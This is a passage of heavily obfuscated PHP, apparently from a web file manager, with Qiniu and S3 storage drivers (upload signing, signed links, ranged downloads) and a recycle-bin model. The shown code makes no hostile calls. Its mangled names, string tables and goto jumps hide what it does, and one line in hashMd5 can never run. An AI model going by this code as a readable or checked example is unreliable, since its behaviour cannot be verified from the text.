0; while (!0) { check_abort(); list($§İğé¿, $µö„œü) = $this->bucketManager->listFiles($this->bucket, $­Èö‘ò¢, $¬Ü™Ğ¬, $¾Ùœ¼ì, $ÍÙ”´şÙ); if ($µö„œü) { break; } $¬Ü™Ğ¬ = array_key_exists($•¦»âß[1380], $§İğé¿) ? $¬Ü™Ğ¬ = $§İğé¿[$•¦»âß[1413]] : $•¦»âß[12]; if ($Û¼²ãµ´) { if (!empty($§İğé¿[$•¦»âß[1414]])) { $İ—ôŞ += count($§İğé¿[$•¦»âß[1414]]); } if (!empty($§İğé¿[$•¦»âß[1415]])) { $Ú²ÜÇ¼ş += count($§İğé¿[$•¦»âß[1415]]); } if ($¬Ü™Ğ¬ === $•¦»âß[12]) { break; } continue; } if ($©·¿ò“Ã) { if (!empty($§İğé¿[$•¦»âß[1414]])) { return !0; } } else { if (!empty($§İğé¿[$•¦»âß[1415]])) { return !0; } } if ($¬Ü™Ğ¬ === $•¦»âß[12]) { break; } } if ($Û¼²ãµ´) { return array($•¦»âß[202] => $İ—ôŞ, $•¦»âß[203] => $Ú²ÜÇ¼ş); } return !1; } public function listAll($ï·¼ø’İ) { $ßãğõ ó =& $_SERVER[¥Ÿ©ÒèÌ]; $ÈÕÄ Ú = $this->fileList($ï·¼ø’İ, $ßãğõ ó[12], !0); $½»ï‘ã‚ = array(); foreach ($ÈÕÄ Ú[$ßãğõ ó[76]] as $øûÂï¶‰) { $½»ï‘ã‚[$øûÂï¶‰[$ßãğõ ó[95]]] = $øûÂï¶‰[$ßãğõ ó[80]]; } foreach ($ÈÕÄ Ú[$ßãğõ ó[77]] as $øûÂï¶‰) { if (is_string($øûÂï¶‰)) { $½»ï‘ã‚[$øûÂï¶‰] = 0; } } return $this->listAllFiles($ï·¼ø’İ, array_keys($½»ï‘ã‚), $½»ï‘ã‚); } private function fileList($½‚ùîôÍ, $©¬¿€Õö = '', $†Ç¥˜ºü = 0) { $¹ºóŞùø =& $_SERVER[¥Ÿ©ÒèÌ]; $½‚ùîôÍ = trim($½‚ùîôÍ, $¹ºóŞùø[8]); $Åƒ”ÇÕ = empty($½‚ùîôÍ) && $½‚ùîôÍ !== $¹ºóŞùø[190] ? $¹ºóŞùø[12] : $½‚ùîôÍ . $¹ºóŞùø[8]; $¥®–Í  = $¹ºóŞùø[12]; $†ñ‚ÃàÖ = 1000; $…’ºá¾ = $this->listItemCache === !1 ? !1 : !0; $ùÊ½ÅÙ = $©£­·ë° = array(); while (!0) { check_abort(); list($±¤Á»À, $Í¹Ë©‰³) = $this->bucketManager->listFiles($this->bucket, $Åƒ”ÇÕ, $¥®–Í , $†ñ‚ÃàÖ, $©¬¿€Õö); if ($Í¹Ë©‰³) { break; } $¥®–Í  = array_key_exists($¹ºóŞùø[1380], $±¤Á»À) ? $¥®–Í  = $±¤Á»À[$¹ºóŞùø[1413]] : $¹ºóŞùø[12]; $”ËàùñÖ = isset($±¤Á»À[$¹ºóŞùø[1414]]) ? $±¤Á»À[$¹ºóŞùø[1414]] : array(); $èÊÕÂä… = isset($±¤Á»À[$¹ºóŞùø[1415]]) ? $±¤Á»À[$¹ºóŞùø[1415]] : array(); foreach ($”ËàùñÖ as $ÊĞ¸´ä‡) { if ($ÊĞ¸´ä‡[$¹ºóŞùø[95]] == $Åƒ”ÇÕ) { continue; } $ÍÕµ× = $ÊĞ¸´ä‡[$¹ºóŞùø[95]]; $ÏŸëİ¹ = $ÊĞ¸´ä‡[$¹ºóŞùø[1411]]; $ÊĞ¸´ä‡[$¹ºóŞùø[80]] = $ÏŸëİ¹; $¬‘ãş³Ç = $ÏŸëİ¹ == 0 && substr($ÍÕµ×, strlen($ÍÕµ×) - 1, 1) == $¹ºóŞùø[8] ? !0 : !1; if ($…’ºá¾) { $this->cacheMethod($¹ºóŞùø[198], $ÍÕµ×, $¬‘ãş³Ç); $this->cacheMethod($¹ºóŞùø[199], $ÍÕµ×, $ÊĞ¸´ä‡); } if ($¬‘ãş³Ç) { $ùÊ½ÅÙ[] = $ÍÕµ×; continue; } $©£­·ë°[] = $†Ç¥˜ºü ? $ÊĞ¸´ä‡ : $ÍÕµ×; } foreach ($èÊÕÂä… as $ÍÕµ×) { if ($ÍÕµ× == $Åƒ”ÇÕ) { continue; } $ùÊ½ÅÙ[] = $ÍÕµ×; if ($…’ºá¾) { $this->cacheMethod($¹ºóŞùø[198], $ÍÕµ×, !0); } } if ($¥®–Í  === $¹ºóŞùø[12]) { break; } } if ($…’ºá¾) { $this->cacheMethod($¹ºóŞùø[198], $½‚ùîôÍ, !0); } return array($¹ºóŞùø[77] => $ùÊ½ÅÙ, $¹ºóŞùø[76] => $©£­·ë°); } public function canRead($Ì£Ñ¢‡©) { return $this->exist($Ì£Ñ¢‡©) ? !0 : !1; } public function canWrite($Ø×Ù”ˆ) { return $this->exist($Ø×Ù”ˆ) ? !0 : !1; } public function getContent($‹¥‚ßûî) { return $this->fileSubstr($‹¥‚ßûî, 0, -1); } public function setContent($ä„ÍŠÂ¹, $ˆ´±áÌ = '') { $Âî¥şÔÊ = $this->tempFile($this->pathThis($ä„ÍŠÂ¹)); file_put_contents($Âî¥şÔÊ, $ˆ´±áÌ); if ($this->upload($ä„ÍŠÂ¹, $Âî¥şÔÊ)) { $this->tempFileRemve($Âî¥şÔÊ); return !0; } return !1; } public function refreshUrls($öŸ£äŠ) { $Ë¸í‘Ú‹ =& $_SERVER[¥Ÿ©ÒèÌ]; $şÚ÷Õ‚ = array(); if (is_array($öŸ£äŠ)) { foreach ($öŸ£äŠ as $ı”âŒª) { $şÚ÷Õ‚[] = $this->link($ı”âŒª); } } else { $şÚ÷Õ‚[] = $this->link($öŸ£äŠ); } $™æãÈù = new Qiniu\Cdn\CdnManager($this->auth); list($•Ğˆâçö, $¦Æ¢à¿) = $™æãÈù->refreshUrls($şÚ÷Õ‚); if ($¦Æ¢à¿) { return !1; } return $•Ğˆâçö[$Ë¸í‘Ú‹[1167]] == $Ë¸í‘Ú‹[750] ? !0 : !1; } public function fileSubstr($‘šá”­¿, $Å¥ÛÙîÊ, $ä¶´ø¢’) { $Ãü‘­¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!($Ê©›İ¦ = $this->link($‘šá”­¿))) { return !1; } $ŞÓ¶€£ƒ = !1; if ($ä¶´ø¢’ > 0) { $ïÀÑ•ÑÆ = $Å¥ÛÙîÊ + $ä¶´ø¢’ - 1; $ŞÓ¶€£ƒ = array($Ãü‘­¾[1416] . $Å¥ÛÙîÊ . $Ãü‘­¾[460] . $ïÀÑ•ÑÆ); } $áÜôÊóĞ = url_request($Ê©›İ¦, $Ãü‘­¾[225], !1, $ŞÓ¶€£ƒ); return $áÜôÊóĞ[$Ãü‘­¾[740]] ? $áÜôÊóĞ[$Ãü‘­¾[1177]] : !1; } public function upload($¬·šÙ…½, $¤Ø†Ï°, $¼„¹×· = false, $˜Á‹Ü·ì = REPEAT_REPLACE) { $íİåÕ´ = new Qiniu\Storage\UploadManager(); $ŠÜÊçë = $this->auth->uploadToken($this->bucket, $¬·šÙ…½); $ò‡Û•öç = get_file_mime(get_path_ext($¤Ø†Ï°)); list($ÙŒ“Èì, $¼Óşõ‚È) = $íİåÕ´->putFile($ŠÜÊçë, $¬·šÙ…½, $¤Ø†Ï°, null, $ò‡Û•öç); return $¼Óşõ‚È ? !1 : $this->getPathOuter($¬·šÙ…½); } public function uploadFormData($¡§õ÷ª¬, $æèè·Ü« = 3600) { return $this->uploadToken($¡§õ÷ª¬, $æèè·Ü«); } public function multiUploadFormData($Ü³Ã«û„, $”Ù¿İë“ = 3600) { return $this->uploadToken($Ü³Ã«û„, $”Ù¿İë“); } private function uploadToken($¯…Öœ’², $Íõå­ÉĞ = 3600) { $¹‰ğ·˜Ë =& $_SERVER[¥Ÿ©ÒèÌ]; $—§ÑÈ÷‘ = $Íõå­ÉĞ; $şÊ™Ã = array($¹‰ğ·˜Ë[1417] => $¹‰ğ·˜Ë[1418]); $‚ªµÃ”À = $¯…Öœ’²; $Û®ÍèÕú = $this->auth->uploadToken($this->bucket, $‚ªµÃ”À, $—§ÑÈ÷‘, $şÊ™Ã, !0); $²Ü“¶çø = empty($this->region) || $this->region == $¹‰ğ·˜Ë[1419] ? $¹‰ğ·˜Ë[12] : $¹‰ğ·˜Ë[460] . $this->region; $‰üİú = http_type() . "\72\x2f\x2f\165\160\154\x6f\x61\144{$²Ü“¶çø}\x2e\161\x69\x6e\x69\165\x70\x2e\143\157\155\x2f"; return array($¹‰ğ·˜Ë[1420] => $Û®ÍèÕú, $¹‰ğ·˜Ë[1421] => $‰üİú); } public function download($êàÄö, $çĞ…€˜‹) { $¿©¨¶…Ë = IO::getPathInner(IO::mkfile($çĞ…€˜‹)); if (!($ƒƒË‚çª = $this->link($êàÄö))) { return !1; } $Æö£Ë† = 0; $“ˆÅŠò‹ = 1024 * 200; $„½øäê = fopen($¿©¨¶…Ë, $_SERVER[¥Ÿ©ÒèÌ][1422]); while (!0) { $ûßşï¸û = $this->fileSubstr($êàÄö, $Æö£Ë†, $“ˆÅŠò‹); if ($ûßşï¸û === !1) { return !1; } fwrite($„½øäê, $ûßşï¸û); $Æö£Ë† += $“ˆÅŠò‹; if (strlen($ûßşï¸û) < $“ˆÅŠò‹) { break; } } fclose($„½øäê); return $çĞ…€˜‹; } public function link($»éÀÕàú, $ÍÀŒŠ· = '') { if (!$this->isFile($»éÀÕàú)) { return !1; } $åÅøÑô = $this->getHost() . $_SERVER[¥Ÿ©ÒèÌ][8] . $this->pathEncode($»éÀÕàú) . $ÍÀŒŠ·; return $this->auth->privateDownloadUrl($åÅøÑô, 3600 * 12); } public function fileOut($èØÖèæÙ, $³±¢í´› = false, $óÚï˜Ô¾ = false, $àÂŸ´å– = '') { $òáÌá‚Í =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($èØÖèæÙ, $³±¢í´›, $óÚï˜Ô¾, $àÂŸ´å–); } if (!$óÚï˜Ô¾) { $óÚï˜Ô¾ = $this->pathThis($èØÖèæÙ); } $ù¦²—Î² = $³±¢í´› ? $òáÌá‚Í[1423] . rawurlencode($óÚï˜Ô¾) : $òáÌá‚Í[12]; $¼Š¿Ó˜ = $this->link($èØÖèæÙ, $ù¦²—Î²); $this->fileOutLink($¼Š¿Ó˜); } public function fileOutServer($³­÷Ò†Ï, $šÜ¸‘§æ = false, $İ½ššö‡ = false, $šÄ¥¤ÊŞ = '') { parent::fileOut($³­÷Ò†Ï, $šÜ¸‘§æ, $İ½ššö‡, $šÄ¥¤ÊŞ); } public function fileOutImage($•„­ıËş, $§¨¬²ï = 250) { $Ù‡ïú·Ç = $this->link($•„­ıËş, $_SERVER[¥Ÿ©ÒèÌ][1424] . $§¨¬²ï); $this->fileOutLink($Ù‡ïú·Ç); } public function fileOutImageServer($¦à¬´¡ã, $ñË¤»ƒ‘ = 250) { parent::fileOutImage($¦à¬´¡ã, $ñË¤»ƒ‘); } public function hashMd5($¨å¡ÄÚ) { $äŠÖ—Á =& $_SERVER[¥Ÿ©ÒèÌ]; $§ ¦Öë = $this->objectMeta($¨å¡ÄÚ); return isset($§ ¦Öë[$äŠÖ—Á[207]]) ? $§ ¦Öë[$äŠÖ—Á[207]] : !1; $€íœ“ìñ = $this->link($¨å¡ÄÚ, $äŠÖ—Á[1425]); } public function size($¿şÌ€®È) { $ğûª³õ¬ = $this->objectMeta($¿şÌ€®È); return $ğûª³õ¬ ? $ğûª³õ¬[$_SERVER[¥Ÿ©ÒèÌ][80]] : 0; } public function info($ıĞ‘öÜ±) { if ($this->isFolder($ıĞ‘öÜ±)) { return $this->folderInfo($ıĞ‘öÜ±); } else { if ($this->isFile($ıĞ‘öÜ±)) { return $this->fileInfo($ıĞ‘öÜ±); } } return !1; } public function exist($¡Ï³”Õ¦) { return $this->isFile($¡Ï³”Õ¦) || $this->isFolder($¡Ï³”Õ¦); } public function isFile($õİ§şÇÀ) { return !$this->isFolder($õİ§şÇÀ) && $this->objectMeta($õİ§şÇÀ); } public function isFolder($Ğ¸»ÚÀ) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][198], $Ğ¸»ÚÀ); } protected function objectMeta($û±òö˜¹) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][199], $û±òö˜¹); } protected function _objectMeta($ÁŸ¸˜ Ğ) { $»İº—ª =& $_SERVER[¥Ÿ©ÒèÌ]; list($á³…ªè…, $ãŞ¼Åµ¿) = $this->bucketManager->stat($this->bucket, $ÁŸ¸˜ Ğ); if ($á³…ªè…) { $á³…ªè…[$»İº—ª[80]] = intval($á³…ªè…[$»İº—ª[1411]]); } return $á³…ªè…; } protected function _isFolder($‹íˆœ½¤) { $Õë·Öœğ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($‹íˆœ½¤ == $Õë·Öœğ[12] || $‹íˆœ½¤ == $Õë·Öœğ[8]) { return !0; } list($è¶üÛÈ, $¬»ø‡¤Ø) = $this->bucketManager->listFiles($this->bucket, trim($‹íˆœ½¤, $Õë·Öœğ[8]) . $Õë·Öœğ[8], $Õë·Öœğ[12], 1, $Õë·Öœğ[8]); return !empty($è¶üÛÈ[$Õë·Öœğ[1414]]) || !empty($è¶üÛÈ[$Õë·Öœğ[1415]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¡Úşº´€) { parent::__construct($¡Úşº´€); } public function uploadFormData($Šœ©™‘ù, $´âÎï³± = 3600) { $›•«”Öì =& $_SERVER[¥Ÿ©ÒèÌ]; $Ğ…Ÿ‹ = $›•«”Öì[191]; $¶¼‹´şô = $›•«”Öì[1330]; $şÚÎ›÷Ù = $›•«”Öì[62]; $›äÉ®Âà = gmdate($›•«”Öì[1331]); $²àµÓ©Î = gmdate($›•«”Öì[741]); $¼ŞÀ•ï– = $›•«”Öì[1332]; $ÀÜ¤„ « = $´âÎï³± . $›•«”Öì[12]; $ºş…ö = $›•«”Öì[1294]; $ì„¿Ô¶« = array($this->accessKey, $²àµÓ©Î, $this->region, $şÚÎ›÷Ù, $¼ŞÀ•ï–); $Èä¥ı©” = implode($›•«”Öì[8], $ì„¿Ô¶«); $€Ë¬¦Òñ = array($›•«”Öì[1296] => gmdate($›•«”Öì[1295], strtotime($›•«”Öì[1333])), $›•«”Öì[1297] => array(array($›•«”Öì[1299] => $this->bucket), array($›•«”Öì[1298] => $Ğ…Ÿ‹), array($›•«”Öì[1300], $›•«”Öì[1301], $›•«”Öì[12]), array($›•«”Öì[1300], $›•«”Öì[1334], $›•«”Öì[12]), array($›•«”Öì[1300], $›•«”Öì[1335], $›•«”Öì[12]), array($›•«”Öì[1302] => $ºş…ö), array($›•«”Öì[1336] => $Èä¥ı©”), array($›•«”Öì[1337] => $¶¼‹´şô), array($›•«”Öì[1338] => $›äÉ®Âà), array($›•«”Öì[1339] => $ÀÜ¤„ «))); $Ú…æÛ­Ğ = base64_encode(json_encode($€Ë¬¦Òñ)); $˜º‘“•„ = hash_hmac($›•«”Öì[1340], $²àµÓ©Î, $›•«”Öì[1341] . $this->secret, !0); $Ó×ˆíüÆ = hash_hmac($›•«”Öì[1340], $this->region, $˜º‘“•„, !0); $˜ƒÕÙñ† = hash_hmac($›•«”Öì[1340], $şÚÎ›÷Ù, $Ó×ˆíüÆ, !0); $ùò¦™‡ = hash_hmac($›•«”Öì[1340], $¼ŞÀ•ï–, $˜ƒÕÙñ†, !0); $áıÅ ‡ä = hash_hmac($›•«”Öì[1340], $Ú…æÛ­Ğ, $ùò¦™‡); $ßüÌ®ÔÙ = array($›•«”Öì[210] => $›•«”Öì[12], $›•«”Öì[1342] => $›•«”Öì[12], $›•«”Öì[1298] => $Ğ…Ÿ‹, $›•«”Öì[1302] => $ºş…ö, $›•«”Öì[1306] => $Ú…æÛ­Ğ, $›•«”Öì[1343] => $Èä¥ı©”, $›•«”Öì[1344] => $¶¼‹´şô, $›•«”Öì[1345] => $›äÉ®Âà, $›•«”Öì[1346] => $ÀÜ¤„ «, $›•«”Öì[1347] => $áıÅ ‡ä, $›•«”Öì[174] => $this->getHost()); return $ßüÌ®ÔÙ; } public function multiUploadFormData($Õî†úÄÙ, $ô™ÃˆÄ = 3600) { $ŠûèÅ†ş =& $_SERVER[¥Ÿ©ÒèÌ]; $ªÑŸ’ñ¡ = gmdate($ŠûèÅ†ş[1426]); $İ‹ŸõÉ = array(); $¼Ìœø¶Ü = $this->client->getUploadId($this->bucket, $Õî†úÄÙ, $İ‹ŸõÉ); if (!$¼Ìœø¶Ü) { return !1; } return array($ŠûèÅ†ş[218] => $¼Ìœø¶Ü, $ŠûèÅ†ş[174] => $this->getHost() . $ŠûèÅ†ş[8] . $this->pathEncode($Õî†úÄÙ), $ŠûèÅ†ş[219] => $ªÑŸ’ñ¡, $ŠûèÅ†ş[95] => $Õî†úÄÙ); } public function multiUploadAuthData($ŸµáïÁº, $í¥ô× = array()) { $€˜ªÌë‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ã£¸÷§ª = isset($í¥ô×[$€˜ªÌë‚[167]]) ? $í¥ô×[$€˜ªÌë‚[167]] : $€˜ªÌë‚[12]; $şŞÌüµã = $í¥ô×[$€˜ªÌë‚[95]]; unset($í¥ô×[$€˜ªÌë‚[95]]); if (isset($í¥ô×[$€˜ªÌë‚[220]])) { return $this->listUploadParts($şŞÌüµã, $í¥ô×); } $ªìŞÌ¶Ø = array(); if (isset($í¥ô×[$€˜ªÌë‚[1427]])) { $ªìŞÌ¶Ø[$€˜ªÌë‚[1428]] = $í¥ô×[$€˜ªÌë‚[1427]]; } $°á¹¿†³ = explode($€˜ªÌë‚[176], $this->getHost()); $Ëüå“­¨ = array($€˜ªÌë‚[1429] => $°á¹¿†³[1], $€˜ªÌë‚[1430] => $€˜ªÌë‚[12], $€˜ªÌë‚[210] => $€˜ªÌë‚[118], $€˜ªÌë‚[1342] => $í¥ô×[$€˜ªÌë‚[80]]); $Ì¤”ò“ê = $€˜ªÌë‚[223]; $ÔÖ·Š = $€˜ªÌë‚[8] . $this->pathEncode($şŞÌüµã) . $Ã£¸÷§ª; $Å²¼çâ = $this->client->__getSignatureV4($ªìŞÌ¶Ø, $Ëüå“­¨, $Ì¤”ò“ê, $ÔÖ·Š); if (strpos($Ã£¸÷§ª, $€˜ªÌë‚[222]) === 0) { if (isset($ªìŞÌ¶Ø[$€˜ªÌë‚[1428]])) { $±ü“™Ş™ = $ªìŞÌ¶Ø[$€˜ªÌë‚[1428]]; } else { if (isset($Å²¼çâ[$€˜ªÌë‚[1428]])) { $±ü“™Ş™ = $Å²¼çâ[$€˜ªÌë‚[1428]]; } else { $±ü“™Ş™ = hash($€˜ªÌë‚[1340], $€˜ªÌë‚[12]); } } return array($€˜ªÌë‚[229] => $Å²¼çâ[$€˜ªÌë‚[229]], $€˜ªÌë‚[1428] => $±ü“™Ş™, $€˜ªÌë‚[219] => $Å²¼çâ[$€˜ªÌë‚[1431]]); } return $Å²¼çâ[$€˜ªÌë‚[229]]; } public function listUploadParts($—ÚÑ«, $à‰˜·Í = array()) { $ü‹¤ßÚá =& $_SERVER[¥Ÿ©ÒèÌ]; $ĞøÆğ¼º = str_replace($ü‹¤ßÚá[230], $ü‹¤ßÚá[12], $à‰˜·Í[$ü‹¤ßÚá[167]]); $ĞÒğÜˆõ = $this->client->listParts($this->bucket, $—ÚÑ«, $ĞøÆğ¼º); if (!$ĞÒğÜˆõ) { return !1; } $ØÍÁùì‹ = $ü‹¤ßÚá[1432]; foreach ($ĞÒğÜˆõ as $şŸœóş) { $ØÍÁùì‹ .= $ü‹¤ßÚá[1433] . "\74\x50\x61\x72\164\x4e\165\155\x62\145\162\76{$şŸœóş[$ü‹¤ßÚá[1387]]}\74\x2f\120\141\162\x74\x4e\165\155\142\145\162\x3e\12" . "\74\105\124\141\147\x3e{$şŸœóş[$ü‹¤ßÚá[1388]]}\74\57\x45\124\141\147\x3e\12" . $ü‹¤ßÚá[1434]; } $ØÍÁùì‹ .= $ü‹¤ßÚá[1435]; $î´£Á¿í = array(); $Ôâ´É“è = explode($ü‹¤ßÚá[176], $this->getHost()); $¦Æèï› = array($ü‹¤ßÚá[1429] => $Ôâ´É“è[1], $ü‹¤ßÚá[210] => $ü‹¤ßÚá[118], $ü‹¤ßÚá[1342] => strlen($ØÍÁùì‹)); $ºïÂ¤˜Ì = $ü‹¤ßÚá[221]; $Ë¶÷°Çº = $ü‹¤ßÚá[8] . $this->pathEncode($—ÚÑ«) . $à‰˜·Í[$ü‹¤ßÚá[167]]; $îç«Ñ”ğ = $this->client->__getSignatureV4($î´£Á¿í, $¦Æèï›, $ºïÂ¤˜Ì, $Ë¶÷°Çº, $ØÍÁùì‹); return array($ü‹¤ßÚá[229] => $îç«Ñ”ğ[$ü‹¤ßÚá[229]], $ü‹¤ßÚá[219] => $îç«Ñ”ğ[$ü‹¤ßÚá[1431]], $ü‹¤ßÚá[231] => $ĞÒğÜˆõ, $ü‹¤ßÚá[1428] => $îç«Ñ”ğ[$ü‹¤ßÚá[1428]]); } public function link($ğôè„âª, $™•‘ëùÔ = array()) { return parent::link($ğôè„âª, $™•‘ëùÔ); } public function fileOut($À§îÅœ, $¿¯Çü¡¬ = false, $ —•ŠıÜ = false, $© §¶î = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¥Ÿ©ÒèÌ][1436])) { return parent::fileOutServer($À§îÅœ, $¿¯Çü¡¬, $ —•ŠıÜ, $© §¶î); } parent::fileOut($À§îÅœ, $¿¯Çü¡¬, $ —•ŠıÜ, $© §¶î); } public function fileOutImage($ ¨ü¥İ, $ğÀÊÎÅ = 250) { if (strstr($this->endpoint, $_SERVER[¥Ÿ©ÒèÌ][1436])) { return parent::fileOutImageServer($ ¨ü¥İ, $ğÀÊÎÅ); } parent::fileOutImage($ ¨ü¥İ, $ğÀÊÎÅ); } public function fileOutLink($Ïøíß£í) { $æáñ£ÊÂ =& $_SERVER[¥Ÿ©ÒèÌ]; if (substr($Ïøíß£í, 0, 7) == $æáñ£ÊÂ[1309]) { $Ïøíß£í = $æáñ£ÊÂ[1310] . substr($Ïøíß£í, 7); } header($æáñ£ÊÂ[158] . $Ïøíß£í); die; } public function getHost() { $«ÍÇ¬Ì‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ò³ùÂ¦¿ = str_rtrim(parent::getHost(), $«ÍÇ¬Ì‚[8] . $this->bucket); $Ò³ùÂ¦¿ = explode($«ÍÇ¬Ì‚[176], $Ò³ùÂ¦¿); return $Ò³ùÂ¦¿[0] . $«ÍÇ¬Ì‚[176] . $this->bucket . $«ÍÇ¬Ì‚[10] . $Ò³ùÂ¦¿[1]; } } goto eº­Åª¸Şç; d±çÃ¼ÚÄã: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\x63\x65\137\162\x65\143\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\x65\162\164", "\x66\165\156\143\x74\151\157\156")); public function listData($ùÏê §ñ = false) { $÷ÇÀ’àÊ =& $_SERVER[¥Ÿ©ÒèÌ]; $ùÏê §ñ = $ùÏê §ñ ? $ùÏê §ñ : USER_ID; $±ÀŒ®å€ = $this->where(array($÷ÇÀ’àÊ[1630] => $ùÏê §ñ))->select(); return array_to_keyvalue($±ÀŒ®å€, $÷ÇÀ’àÊ[12], $÷ÇÀ’àÊ[403]); } public function moveToRecycle($ÒÛòÛ¯§) { $§õö‘Ü© =& $_SERVER[¥Ÿ©ÒèÌ]; $ƒ¨Øë•¹ = Model($§õö‘Ü©[1311]); $¾Š™¨š™ = $ƒ¨Øë•¹->sourceInfo($ÒÛòÛ¯§); if (!$¾Š™¨š™ || $¾Š™¨š™[$§õö‘Ü©[431]] == $§õö‘Ü©[89]) { return; } $Ôú§úãİ = array($§õö‘Ü©[418] => $ÒÛòÛ¯§, $§õö‘Ü©[1630] => USER_ID, $§õö‘Ü©[580] => $¾Š™¨š™[$§õö‘Ü©[412]], $§õö‘Ü©[581] => $¾Š™¨š™[$§õö‘Ü©[504]], $§õö‘Ü©[584] => $¾Š™¨š™[$§õö‘Ü©[521]]); $this->add($Ôú§úãİ); $this->recycleMove($ÒÛòÛ¯§, 1); if ($¾Š™¨š™[$§õö‘Ü©[411]] == $§õö‘Ü©[89]) { $Ğ÷·®  = array($§õö‘Ü©[584] => array($§õö‘Ü©[544], $¾Š™¨š™[$§õö‘Ü©[521]] . $ÒÛòÛ¯§ . $§õö‘Ü©[545])); $ƒ¨Øë•¹->where($Ğ÷·® )->setField($§õö‘Ü©[431], 1); } } public function clear() { $this->remove(!1); } public function remove($ù¬Ä•Ùª = false, $Àû›‹²° = false) { $˜ü¯¹¯¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $Àû›‹²° = $Àû›‹²° ? $Àû›‹²° : USER_ID; $ÀàâÎù = Model($˜ü¯¹¯¨[1311]); $™„¡è¸ä = $this->listData($Àû›‹²°); $ù¬Ä•Ùª = $ù¬Ä•Ùª === !1 ? !1 : $ù¬Ä•Ùª; $íÍí”‡‡ = array(); foreach ($™„¡è¸ä as $şµŞİ¹©) { if ($ù¬Ä•Ùª != !1 && !in_array($şµŞİ¹©, $ù¬Ä•Ùª)) { continue; } $Ë˜¿ŒìÒ = $ÀàâÎù->sourceInfo($şµŞİ¹©); $ÀàâÎù->remove($şµŞİ¹©, !1); $£Æñ´—˜ = $Ë˜¿ŒìÒ[$˜ü¯¹¯¨[412]] . $˜ü¯¹¯¨[11] . $Ë˜¿ŒìÒ[$˜ü¯¹¯¨[504]]; $íÍí”‡‡[$£Æñ´—˜] = array($˜ü¯¹¯¨[580] => $Ë˜¿ŒìÒ[$˜ü¯¹¯¨[412]], $˜ü¯¹¯¨[504] => $Ë˜¿ŒìÒ[$˜ü¯¹¯¨[504]]); $this->where(array($˜ü¯¹¯¨[403] => $şµŞİ¹©))->delete(); } foreach ($íÍí”‡‡ as $×¥Üªİ’) { $ÀàâÎù->targetSpaceUpdate($×¥Üªİ’[$˜ü¯¹¯¨[412]], $×¥Üªİ’[$˜ü¯¹¯¨[504]]); } } public function restore($¡…í‡ÈŒ = false) { $ø¢ÎÃ°« = $this->listData(); $this->_restoreSource($ø¢ÎÃ°«, $¡…í‡ÈŒ); } public function removeUserAll($Ÿî€—İ²) { $this->remove(!1, $Ÿî€—İ²); } private function _restoreSource($ïıÜ³ó×, $–³çî¡È) { $¡‹‰“Å =& $_SERVER[¥Ÿ©ÒèÌ]; $ğ“…ï˜‘ = Model($¡‹‰“Å[1311]); $–³çî¡È = $–³çî¡È == !1 ? !1 : $–³çî¡È; if (!$ïıÜ³ó×) { return !0; } $Î£—û—î = array(); foreach ($ïıÜ³ó× as $í…™™×Ş) { if ($–³çî¡È != !1 && !in_array($í…™™×Ş, $–³çî¡È)) { continue; } $÷€Ãİí‚ = $ğ“…ï˜‘->sourceInfo($í…™™×Ş); $©ŒŸà£™ = $ğ“…ï˜‘->sourceInfo($÷€Ãİí‚[$¡‹‰“Å[498]]); if ($©ŒŸà£™[$¡‹‰“Å[431]] == $¡‹‰“Å[89]) { continue; } $ğ“…ï˜‘->lockMoveStart($í…™™×Ş); $this->recycleMove($í…™™×Ş, 0); if ($÷€Ãİí‚[$¡‹‰“Å[411]] == $¡‹‰“Å[89]) { $Ì©´¹ÕÎ = array($¡‹‰“Å[584] => array($¡‹‰“Å[544], $÷€Ãİí‚[$¡‹‰“Å[521]] . $í…™™×Ş . $¡‹‰“Å[545])); $ğ“…ï˜‘->where($Ì©´¹ÕÎ)->setField($¡‹‰“Å[431], 0); $this->restoreFolderChildren($í…™™×Ş, $ïıÜ³ó×); } $this->where(array($¡‹‰“Å[403] => $í…™™×Ş))->delete(); $ğ“…ï˜‘->folderSizeReset($÷€Ãİí‚[$¡‹‰“Å[498]]); $Î£—û—î[] = $÷€Ãİí‚[$¡‹‰“Å[498]]; if ($÷€Ãİí‚[$¡‹‰“Å[411]] == $¡‹‰“Å[89]) { $Î£—û—î[] = $í…™™×Ş; } $ğ“…ï˜‘->lockMoveEnd($í…™™×Ş); } $ğ“…ï˜‘->updateModifyTime($Î£—û—î); } private function restoreFolderChildren($è×›¹Éâ, $ª‚¤›ú‹) { $£¬’¤ ¶ =& $_SERVER[¥Ÿ©ÒèÌ]; $å¹í˜ = Model($£¬’¤ ¶[1311]); $÷Ç›Ô°ô = array($£¬’¤ ¶[403] => array($£¬’¤ ¶[7], array())); foreach ($ª‚¤›ú‹ as $†ŠÍçº«) { if ($†ŠÍçº« == $è×›¹Éâ) { continue; } if (!$å¹í˜->isParentOf($è×›¹Éâ, $†ŠÍçº«)) { continue; } $Õıö…ç´ = $å¹í˜->sourceInfo($†ŠÍçº«); if ($Õıö…ç´[$£¬’¤ ¶[411]] == $£¬’¤ ¶[89]) { $÷Ç›Ô°ô[] = array($£¬’¤ ¶[584] => array($£¬’¤ ¶[544], $Õıö…ç´[$£¬’¤ ¶[521]] . $†ŠÍçº« . $£¬’¤ ¶[545])); } else { $÷Ç›Ô°ô[$£¬’¤ ¶[403]][1][] = $†ŠÍçº«; } } if (!$÷Ç›Ô°ô[$£¬’¤ ¶[403]][1]) { unset($÷Ç›Ô°ô[$£¬’¤ ¶[403]]); } if (!$÷Ç›Ô°ô) { return; } $÷Ç›Ô°ô[$£¬’¤ ¶[403]][1] = array_unique($÷Ç›Ô°ô[$£¬’¤ ¶[403]][1]); $÷Ç›Ô°ô[$£¬’¤ ¶[986]] = $£¬’¤ ¶[1902]; $å¹í˜->where($÷Ç›Ô°ô)->setField($£¬’¤ ¶[431], 1); } private function 